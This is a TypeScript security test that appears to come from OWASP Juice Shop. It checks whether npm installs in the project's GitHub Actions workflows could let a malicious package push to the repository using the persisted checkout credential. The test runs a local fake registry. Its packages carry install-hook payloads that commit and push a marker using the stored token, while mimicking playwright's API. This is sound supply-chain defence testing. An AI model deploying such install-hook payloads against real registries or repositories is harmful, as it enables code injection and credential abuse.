/*
 * Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.
 * SPDX-License-Identifier: MIT
 */

import { describe, it } from 'node:test'
import assert from 'node:assert/strict'
import { spawn, spawnSync } from 'child_process'
import { createHash, randomUUID } from 'crypto'
import fs from 'fs'
import http from 'http'
import os from 'os'
import path from 'path'
import { load } from 'js-yaml'

const NODE24 = '/tmp/node24/node-v24.22.3-linux-x64/bin'
const TOKEN = 'actions-placeholder-token'
const MARKER = 'attacker-install-script-pushed'
const REPO_ROOT = path.resolve(__dirname, '../..')
const WORKFLOWS = path.join(REPO_ROOT, '.github/workflows')

interface RunResult {
  pushed: boolean
  marker: string
  detail: string
}

void describe('unpinned package install with a persisted checkout credential', () => {
  void it('does not let that package push to the remote the job can push to', async () => {
    const server = await startGitAndRegistry()
    try {
      const open = await reproduce({
        server,
        command: 'npm install playwright',
        persistCredentials: true,
        contentsWrite: true,
        packageJson: { name: 'harness', version: '1.0.0', private: true }
      })
      assert.equal(open.pushed, true, `harness failed to show an unpinned install pushing: ${open.detail}`)

      const closed = await reproduce({
        server,
        command: 'npm install playwright',
        persistCredentials: false,
        contentsWrite: true,
        packageJson: { name: 'harness', version: '1.0.0', private: true }
      })
      assert.equal(closed.pushed, false, `push succeeded without a persisted credential: ${closed.detail}`)

      const pushes: string[] = []
      for (const file of fs.readdirSync(WORKFLOWS).filter(name => name.endsWith('.yml') || name.endsWith('.yaml'))) {
        const full = path.join(WORKFLOWS, file)
        const doc = load(fs.readFileSync(full, 'utf8')) as WorkflowDoc
        const jobs = doc.jobs ?? {}
        for (const [jobName, job] of Object.entries(jobs)) {
          let persistCredentials = false
          for (const step of job.steps ?? []) {
            if (isCheckout(step)) {
              persistCredentials = persistCredentialsDefault(step)
            }
            const commands = dangerousCommands(step, doc, job)
            for (const command of commands) {
              const attackId = `${file} ${jobName}: ${command}`
              const result = await reproduce({
                server,
                command,
                persistCredentials,
                contentsWrite: contentsCanPush(doc, job),
                packageJson: JSON.parse(fs.readFileSync(path.join(REPO_ROOT, 'package.json'), 'utf8')),
                npmrc: fs.readFileSync(path.join(REPO_ROOT, '.npmrc'), 'utf8'),
                attackId,
                extraEnv: envStrings({ ...(doc.env ?? {}), ...(job.env ?? {}) })
              })
              if (result.pushed) pushes.push(attackId)
            }
          }
        }
      }
      assert.deepEqual(pushes, [], `registry code pushed with the checkout credential:\n${pushes.join('\n')}`)
    } finally {
      await server.close()
    }
  })
})

interface WorkflowDoc {
  env?: Record<string, string>
  permissions?: Permissions
  jobs?: Record<string, WorkflowJob>
}

interface WorkflowJob {
  permissions?: Permissions
  env?: Record<string, string>
  steps?: WorkflowStep[]
}

interface WorkflowStep {
  name?: string
  uses?: string
  run?: string
  with?: Record<string, string>
}

type Permissions = string | Record<string, string>

function isCheckout (step: WorkflowStep): boolean {
  return typeof step.uses === 'string' && step.uses.startsWith('actions/checkout@')
}

function persistCredentialsDefault (step: WorkflowStep): boolean {
  const raw = step.with?.['persist-credentials']
  if (raw === undefined || raw === null || String(raw) === '') return true
  return String(raw).toUpperCase() === 'TRUE'
}

function envStrings (env: Record<string, unknown>): Record<string, string> {
  const out: Record<string, string> = {}
  for (const [key, value] of Object.entries(env)) out[key] = String(value)
  return out
}
function contentsCanPush (doc: WorkflowDoc, job: WorkflowJob): boolean {
  const permissions = job.permissions !== undefined ? job.permissions : doc.permissions
  if (permissions === undefined) return true
  if (permissions === 'write-all') return true
  if (permissions === 'read-all' || permissions === '') return false
  if (typeof permissions === 'object') {
    return permissions.contents === 'write'
  }
  return false
}

function dangerousCommands (step: WorkflowStep, doc: WorkflowDoc, job: WorkflowJob): string[] {
  if (typeof step.run !== 'string') return []
  const script = substitute(step.run, envStrings({ ...(doc.env ?? {}), ...(job.env ?? {}) }))
  const found = new Set<string>()
  collectCommands(script, found, 0)
  if (/require\(['"]playwright['"]\)/.test(script)) found.add('node -e "require(\'playwright\')"')
  return [...found]
}

function collectCommands (script: string, found: Set<string>, depth: number): void {
  if (depth > 4) return
  const lines = script.split('\n')
  let current = ''
  const statements: string[] = []
  for (const line of lines) {
    const trimmed = line.trim()
    if (trimmed.endsWith('\\')) {
      current += trimmed.slice(0, -1) + ' '
      continue
    }
    current += trimmed
    if (current !== '') statements.push(current)
    current = ''
  }
  for (const statement of statements) {
    for (const part of statement.split(/&&|\|\||;/)) {
      const command = part.trim()
      if (command === '') continue
      if (isPackageCommand(command)) found.add(command)
      const run = command.match(/^(?:[A-Za-z_][A-Za-z0-9_]*=\S+\s+)*npm run ([^\s]+)/)
      if (run != null) {
        const body = scriptBody(run[1])
        if (body != null) collectCommands(body, found, depth + 1)
      }
    }
  }
}

function isPackageCommand (command: string): boolean {
  if (/^npm (?:install|i|ci|update|exec)(?:\s|$)/.test(command)) {
    return !/(?:^|\s)--ignore-scripts(?:\s|$)/.test(command)
  }
  return /^npx(?:\s|$)/.test(command)
}

function scriptBody (name: string): string | null {
  const files = [
    path.join(REPO_ROOT, 'package.json'),
    path.join(REPO_ROOT, 'frontend/package.json')
  ]
  for (const file of files) {
    const pkg = JSON.parse(fs.readFileSync(file, 'utf8')) as { scripts?: Record<string, string> }
    if (pkg.scripts?.[name] != null) return pkg.scripts[name]
  }
  return null
}

function substitute (script: string, env: Record<string, string>): string {
  return script.replace(/\$\{\{\s*([^}]+)\s*\}\}/g, (_all, raw: string) => {
    const expr = raw.trim()
    const envMatch = /^env\.([A-Za-z0-9_]+)$/.exec(expr)
    if (envMatch != null) return String(env[envMatch[1]] ?? '')
    if (expr === 'github.workspace') return '${GITHUB_WORKSPACE}'
    return ''
  })
}

interface ReproduceOptions {
  server: GitRegistry
  command: string
  persistCredentials: boolean
  contentsWrite: boolean
  packageJson: Record<string, unknown>
  npmrc?: string
  attackId?: string
  extraEnv?: Record<string, string>
}

async function reproduce (options: ReproduceOptions): Promise<RunResult> {
  const id = randomUUID()
  const work = fs.mkdtempSync(path.join(os.tmpdir(), 'install-push-'))
  const bare = path.join(options.server.root, `${id}.git`)
  const workspace = path.join(work, 'repo')
  const runnerTemp = path.join(work, 'runner')
  fs.mkdirSync(runnerTemp, { recursive: true })
  git(work, ['init', '--bare', '-b', 'master', bare])
  git(bare, ['config', 'http.receivepack', 'true'])
  git(work, ['clone', bare, workspace])
  git(workspace, ['config', 'user.email', 'dev@example.com'])
  git(workspace, ['config', 'user.name', 'Dev'])
  fs.writeFileSync(path.join(workspace, 'README'), 'seed\n')
  git(workspace, ['add', 'README'])
  git(workspace, ['commit', '-m', 'seed'])
  git(workspace, ['push', 'origin', 'master'])
  const remote = `http://127.0.0.1:${options.server.port}/${id}.git`
  git(workspace, ['remote', 'set-url', 'origin', remote])
  fs.writeFileSync(path.join(workspace, 'package.json'), JSON.stringify(options.packageJson))
  if (options.npmrc != null) fs.writeFileSync(path.join(workspace, '.npmrc'), options.npmrc)
  if (options.persistCredentials && options.contentsWrite) {
    persistCheckoutCredential({
      workspace,
      runnerTemp,
      serverUrl: `http://127.0.0.1:${options.server.port}`,
      token: TOKEN
    })
  }
  const npm = npmBin()
  const env: NodeJS.ProcessEnv = {
    ...process.env,
    PATH: `${path.dirname(npm)}:${process.env.PATH ?? ''}`,
    GITHUB_WORKSPACE: workspace,
    GIT_TERMINAL_PROMPT: '0',
    ATTACK_ID: options.attackId ?? options.command,
    ...options.extraEnv,
    npm_config_registry: `http://127.0.0.1:${options.server.port}/registry`,
    npm_config_audit: 'false',
    npm_config_fund: 'false',
    npm_config_update_notifier: 'false',
    npm_config_foreground_scripts: 'true',
    npm_config_prefix: path.join(work, 'npm-prefix')
  }
  delete env.npm_config_ignore_scripts
  const child = spawn('bash', ['-c', options.command], {
    cwd: workspace,
    env,
    stdio: ['ignore', 'pipe', 'pipe']
  })
  let stdout = ''
  let stderr = ''
  child.stdout?.on('data', (chunk: Buffer) => { stdout += chunk.toString() })
  child.stderr?.on('data', (chunk: Buffer) => { stderr += chunk.toString() })
  const status = await new Promise<number>((resolve) => {
    child.on('close', (code) => resolve(code ?? 1))
  })
  const installed = path.join(workspace, 'node_modules/playwright/package.json')
  let installedPkg = ''
  if (fs.existsSync(installed)) installedPkg = fs.readFileSync(installed, 'utf8')
  const marker = git(bare, ['show', 'master:' + MARKER], true).stdout
  const pushed = git(bare, ['cat-file', '-e', 'master:' + MARKER], true).status === 0
  fs.rmSync(work, { recursive: true, force: true })
  return {
    pushed,
    marker: marker.trim(),
    detail: `${options.attackId ?? options.command} exit=${status}\n${stderr.slice(-2000)}\n${stdout.slice(-800)}\ninstalled=${installedPkg.slice(0, 500)}`
  }
}

function persistCheckoutCredential (input: { workspace: string, runnerTemp: string, serverUrl: string, token: string }): void {
  const origin = new URL(input.serverUrl).origin
  const tokenConfigKey = `http.${origin}/.extraheader`
  const basic = Buffer.from(`x-access-token:${input.token}`, 'utf8').toString('base64')
  const placeholder = 'AUTHORIZATION: basic ***'
  const value = `AUTHORIZATION: basic ${basic}`
  const credentials = path.join(input.runnerTemp, `git-credentials-${randomUUID()}.config`)
  git(input.workspace, ['config', '--file', credentials, tokenConfigKey, placeholder])
  const content = fs.readFileSync(credentials, 'utf8').replace(placeholder, value)
  fs.writeFileSync(credentials, content)
  const gitDir = path.join(input.workspace, '.git').replace(/\\/g, '/')
  git(input.workspace, ['config', '--local', `includeIf.gitdir:${gitDir}.path`, credentials])
  git(input.workspace, ['config', '--local', `includeIf.gitdir:${gitDir}/worktrees/*.path`, credentials])
}

function npmBin (): string {
  const bundled = path.join(NODE24, 'npm')
  if (fs.existsSync(bundled)) return bundled
  return 'npm'
}

function git (cwd: string, args: string[], allowFailure = false): { status: number, stdout: string, stderr: string } {
  const result = spawnSync('git', args, { cwd, encoding: 'utf8' })
  const status = result.status ?? 1
  if (!allowFailure && status !== 0) {
    throw new Error(`git ${args.join(' ')} failed: ${result.stderr || result.stdout}`)
  }
  return { status, stdout: result.stdout ?? '', stderr: result.stderr ?? '' }
}

interface GitRegistry {
  port: number
  root: string
  close: () => Promise<void>
}

async function startGitAndRegistry (): Promise<GitRegistry> {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'git-registry-'))
  const tarballs = new Map<string, Buffer>()
  const server = http.createServer((req, res) => {
    const url = new URL(req.url ?? '/', 'http://127.0.0.1')
    if (url.pathname.startsWith('/registry/')) {
      handleRegistry(url, req, res, tarballs)
      return
    }
    handleGit(url, req, res, root)
  })
  await new Promise<void>((resolve) => {
    server.listen(0, '127.0.0.1', () => resolve())
  })
  const address = server.address()
  if (address == null || typeof address === 'string') throw new Error('no port')
  return {
    port: address.port,
    root,
    close: async () => {
      await new Promise<void>((resolve, reject) => {
        server.close((err) => err != null ? reject(err) : resolve())
      })
      fs.rmSync(root, { recursive: true, force: true })
    }
  }
}

function handleGit (url: URL, req: http.IncomingMessage, res: http.ServerResponse, root: string): void {
  const auth = req.headers.authorization ?? ''
  const expected = 'basic ' + Buffer.from(`x-access-token:${TOKEN}`, 'utf8').toString('base64')
  if (auth.toLowerCase() !== expected.toLowerCase()) {
    res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="git"' })
    res.end()
    return
  }
  const chunks: Buffer[] = []
  req.on('data', (chunk: Buffer) => chunks.push(chunk))
  req.on('end', () => {
    const body = Buffer.concat(chunks)
    const env = {
      ...process.env,
      GIT_PROJECT_ROOT: root,
      GIT_HTTP_EXPORT_ALL: '1',
      REQUEST_METHOD: req.method ?? 'GET',
      PATH_INFO: url.pathname,
      QUERY_STRING: url.searchParams.toString() ? url.search : url.search.replace(/^\?/, ''),
      CONTENT_TYPE: String(req.headers['content-type'] ?? ''),
      CONTENT_LENGTH: String(body.length)
    }
    env.QUERY_STRING = url.search.startsWith('?') ? url.search.slice(1) : ''
    const child = spawn('git', ['http-backend'], { env })
    child.stdin.end(body)
    const out: Buffer[] = []
    child.stdout.on('data', (chunk: Buffer) => out.push(chunk))
    child.on('close', () => {
      const raw = Buffer.concat(out)
      const sep = raw.indexOf('\r\n\r\n')
      if (sep < 0) {
        res.writeHead(500)
        res.end()
        return
      }
      const headerText = raw.subarray(0, sep).toString('utf8')
      const payload = raw.subarray(sep + 4)
      const headers: Record<string, string | number> = {}
      let status = 200
      for (const line of headerText.split('\r\n')) {
        const idx = line.indexOf(':')
        if (idx < 0) continue
        const key = line.slice(0, idx).trim()
        const value = line.slice(idx + 1).trim()
        if (key.toLowerCase() === 'status') status = Number(value.split(' ')[0])
        else headers[key] = value
      }
      res.writeHead(status, headers)
      res.end(payload)
    })
  })
}

function handleRegistry (url: URL, req: http.IncomingMessage, res: http.ServerResponse, tarballs: Map<string, Buffer>): void {
  const namePath = decodeURIComponent(url.pathname.replace(/^\/registry\//, ''))
  if (req.method === 'GET' && namePath.includes('/-/')) {
    const file = tarballs.get(namePath)
    if (file == null) {
      res.writeHead(404)
      res.end()
      return
    }
    res.writeHead(200, { 'content-type': 'application/octet-stream' })
    res.end(file)
    return
  }
  if (req.method !== 'GET') {
    res.writeHead(200, { 'content-type': 'application/json' })
    res.end('{}')
    return
  }
  const name = namePath.replace(/\/$/, '')
  const versions = versionsFor(name)
  const packumentVersions: Record<string, unknown> = {}
  let latest = '0.0.0'
  for (const [version, malicious] of versions) {
    const packed = pack(name, version, malicious)
    const tarName = `${name.split('/').pop()}-${version}.tgz`
    const key = `${name}/-/${tarName}`
    tarballs.set(key, packed.tarball)
    const integrity = 'sha512-' + createHash('sha512').update(packed.tarball).digest('base64')
    packumentVersions[version] = {
      name,
      version,
      hasInstallScript: malicious,
      dist: {
        tarball: `http://${req.headers.host}/registry/${key}`,
        shasum: createHash('sha1').update(packed.tarball).digest('hex'),
        integrity
      }
    }
    if (malicious) latest = version
  }
  if (latest === '0.0.0') latest = [...versions.keys()].sort().pop() ?? '0.0.0'
  const body = {
    name,
    'dist-tags': { latest },
    versions: packumentVersions
  }
  res.writeHead(200, { 'content-type': 'application/json' })
  res.end(JSON.stringify(body))
}

function versionsFor (name: string): Map<string, boolean> {
  const versions = new Map<string, boolean>()
  versions.set('99.0.0', true)
  const specs = dependencySpecs(name)
  for (const spec of specs) {
    const exact = /^\d+\.\d+\.\d+(?:-[0-9A-Za-z.-]+)?$/.exec(spec)
    if (exact != null) {
      versions.set(exact[0], false)
      continue
    }
    const malicious = maliciousSatisfying(spec)
    if (malicious != null) versions.set(malicious, true)
  }
  return versions
}

function dependencySpecs (name: string): string[] {
  const specs: string[] = []
  for (const file of [path.join(REPO_ROOT, 'package.json'), path.join(REPO_ROOT, 'frontend/package.json')]) {
    const pkg = JSON.parse(fs.readFileSync(file, 'utf8')) as {
      dependencies?: Record<string, string>
      devDependencies?: Record<string, string>
      optionalDependencies?: Record<string, string>
    }
    for (const group of [pkg.dependencies, pkg.devDependencies, pkg.optionalDependencies]) {
      if (group?.[name] != null) specs.push(group[name])
    }
  }
  return specs
}

function maliciousSatisfying (spec: string): string | null {
  const alternatives = spec.split('||').map(part => part.trim()).filter(part => part !== '')
  for (const alternative of alternatives.length === 0 ? [spec] : alternatives) {
    const caret = /^\^(\d+)\.(\d+)\.(\d+)/.exec(alternative)
    if (caret != null) {
      const major = Number(caret[1])
      const minor = Number(caret[2])
      if (major > 0) return `${major}.999.0`
      if (minor > 0) return `0.${minor}.999`
      continue
    }
    const tilde = /^~(\d+)\.(\d+)\.(\d+)/.exec(alternative)
    if (tilde != null) return `${tilde[1]}.${tilde[2]}.999`
    if (alternative === '*' || alternative === 'latest' || alternative === 'x') return '99.0.0'
  }
  return null
}

function pack (name: string, version: string, malicious: boolean): { tarball: Buffer } {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'pkg-'))
  const pkgDir = path.join(dir, 'package')
  fs.mkdirSync(pkgDir)
  const unscoped = name.split('/').pop() ?? name
  const manifest: Record<string, unknown> = {
    name,
    version,
    main: 'index.js',
    gypfile: false
  }
  if (malicious) {
    manifest.scripts = { preinstall: 'node payload.js', install: 'node payload.js', postinstall: 'node payload.js' }
    manifest.bin = { [unscoped]: 'payload.js' }
    fs.writeFileSync(path.join(pkgDir, 'payload.js'), PAYLOAD)
  }
  fs.writeFileSync(path.join(pkgDir, 'index.js'), malicious ? PAYLOAD : 'module.exports = {}\n')
  fs.writeFileSync(path.join(pkgDir, 'package.json'), JSON.stringify(manifest))
  const packed = spawnSync('tar', ['-czf', 'out.tgz', 'package'], { cwd: dir })
  if (packed.status !== 0) throw new Error(packed.stderr?.toString() || 'tar failed')
  const tarball = fs.readFileSync(path.join(dir, 'out.tgz'))
  fs.rmSync(dir, { recursive: true, force: true })
  return { tarball }
}

const PAYLOAD = `'use strict'
const { execFileSync } = require('child_process')
const fs = require('fs')
const path = require('path')
function git (cwd, args) {
  return execFileSync('git', args, { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] })
}
function rootOf () {
  const candidates = []
  if (process.env.GITHUB_WORKSPACE) candidates.push(process.env.GITHUB_WORKSPACE)
  try { candidates.push(git(process.cwd(), ['rev-parse', '--show-toplevel']).trim()) } catch (err) {}
  for (const candidate of candidates) {
    if (candidate && fs.existsSync(path.join(candidate, '.git'))) return candidate
  }
  return ''
}
const root = rootOf()
if (root) {
  const marker = ${JSON.stringify(MARKER)}
  try {
    fs.writeFileSync(path.join(root, marker), String(process.env.ATTACK_ID || '') + '\\n')
    git(root, ['add', marker])
    const staged = git(root, ['diff', '--cached', '--name-only'])
    if (staged.trim() !== '') {
      git(root, ['-c', 'user.email=attacker@example.com', '-c', 'user.name=Attacker', 'commit', '-m', 'pwned'])
    }
    git(root, ['push', 'origin', 'HEAD:master'])
  } catch (err) {}
}
if (require.main !== module) {
  exports.chromium = {
    launch: async () => ({
      newPage: async () => ({
        goto: async () => {},
        setViewportSize: async () => {},
        screenshot: async () => {}
      }),
      close: async () => {}
    })
  }
}
`
